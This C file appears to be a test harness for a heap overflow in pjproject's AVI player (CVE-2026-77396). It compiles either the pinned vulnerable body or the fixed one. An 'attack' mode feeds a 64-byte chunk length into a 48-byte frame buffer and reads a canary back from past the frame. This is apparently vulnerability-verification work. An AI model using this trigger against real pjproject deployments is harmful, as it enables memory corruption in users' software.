/*
 * Frontier harness for CVE-2026-77396 (pjproject AVI player, GHSA-6p2p-5wf8-h5hr).
 * The #include'd bodies are byte-exact excerpts of upstream avi_player.c at
 * c1ea7648fb53f945493972a23133b9e0d3e4a1fe (vulnerable) and the fix commit
 * 7ecc6584969a923c4190b6912afbf5952b5a4b9f (fixed). Only types, file I/O and
 * logging are stand-ins; the frame-copy decision under test is verbatim.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef uint32_t pj_uint32_t;
typedef uint16_t pj_uint16_t;
typedef int64_t pj_ssize_t;
typedef int64_t pj_off_t;
typedef int pj_status_t;
typedef int pj_oshandle_t;

#define PJ_SUCCESS              0
#define PJMEDIA_ENOTVALIDAVI    (-99)
#define AVI_EOF                 (-100)
#define PJ_SEEK_CUR             1
#define PJMEDIA_TYPE_VIDEO      1
#define PJMEDIA_FRAME_TYPE_VIDEO 3
#define PJMEDIA_FRAME_TYPE_AUDIO 2
#define THIS_FILE               "harness.c"
#define PJ_LOG(level, args)     ((void)0)
/* Release build: the vulnerable body's only guard is a no-op assertion. */
#define pj_assert(expr)         ((void)0)

typedef struct {
    pj_uint32_t id;
    pj_uint32_t len;
} pjmedia_avi_subchunk;

typedef struct {
    void *buf;
    unsigned size;
    int type;
} pjmedia_frame;

typedef struct avi_reader_port {
    struct { struct { struct { int type; } fmt; } info; } base;
    pj_oshandle_t fd;
    pj_ssize_t size_left;
    unsigned bits_per_sample;
    unsigned stream_id;
    unsigned char pad;
} avi_reader_port;

static const unsigned char *g_payload;
static size_t g_payload_len;
static pj_off_t g_pos;

static pj_status_t pj_file_setpos(pj_oshandle_t fd, pj_off_t off, int whence)
{
    (void) fd;
    if (whence == PJ_SEEK_CUR)
        g_pos += off;
    else
        g_pos = off;
    return PJ_SUCCESS;
}

/* Stand-in for upstream file_read3(): the declared chunk length is passed
 * straight to memcpy, exactly as the pj_file_read call in the pinned body. */
static pj_status_t file_read3(pj_oshandle_t fd, void *data, pj_ssize_t size,
                              pj_uint16_t bits, pj_ssize_t *psz_read)
{
    (void) fd;
    (void) bits;
    if (size < 0 || (size_t) size > g_payload_len)
        return AVI_EOF;
    memcpy(data, g_payload, (size_t) size);
    g_pos += size;
    if (psz_read)
        *psz_read = size;
    return PJ_SUCCESS;
}

static pj_status_t avi_get_frame(avi_reader_port *fport, pjmedia_frame *frame)
{
    /* Chunk id "00dc" (video) and file-supplied chunk length. */
    pjmedia_avi_subchunk ch = { 0x63643030u, 0 };
    pj_ssize_t size_to_read = (pj_ssize_t) frame->size;
    pj_ssize_t size_read = 0;
    pj_status_t status = PJ_SUCCESS;

    ch.len = (pj_uint32_t) g_payload_len;

#ifdef VARIANT_FIXED
#include "../pins/avi-fixed.inc"
#else
#include "../pins/avi-vulnerable.inc"
#endif
    return PJ_SUCCESS;

on_error2:
    return status;
}

int main(int argc, char **argv)
{
    int attack = (argc > 1 && strcmp(argv[1], "attack") == 0);
    unsigned char payload[80];
    /* Logical frame capacity from declared AVI dimensions. In a release
     * build the chunk length is never reconciled with this value. */
    unsigned frame_size = 48;
    unsigned char *buf;
    pjmedia_frame frame;
    avi_reader_port fport;
    pj_status_t rc;
    size_t i;

    for (i = 0; i < sizeof(payload); ++i)
        payload[i] = 'A';
    memcpy(payload + 48, "MISHE-PJPROJECT!!", 17);
    g_payload = payload;
    g_payload_len = attack ? 64 : 48;

    memset(&fport, 0, sizeof(fport));
    fport.base.info.fmt.type = PJMEDIA_TYPE_VIDEO;
    fport.fd = 1;
    fport.stream_id = 0;

#ifdef PLAIN_MODE
    /* Physical buffer is large enough for a post-mortem readback; the
     * logical frame->size stays 48, so bytes 48..63 are outside the frame. */
    buf = (unsigned char *) malloc(96);
    memset(buf, 'A', 96);
#else
    buf = (unsigned char *) malloc(frame_size);
    if (!buf)
        return 2;
    memset(buf, 'A', frame_size);
#endif
    frame.buf = buf;
    frame.size = frame_size;
    frame.type = 0;

    rc = avi_get_frame(&fport, &frame);
    printf("RET=%d\n", (int) rc);
    printf("AVI_FRAME_SIZE=%u\n", frame.size);
#ifdef PLAIN_MODE
    printf("CANARY_AFTER=");
    for (i = 48; i < 64; ++i)
        printf("%02x", buf[i]);
    printf("\n");
#endif
    free(buf);
    return 0;
}
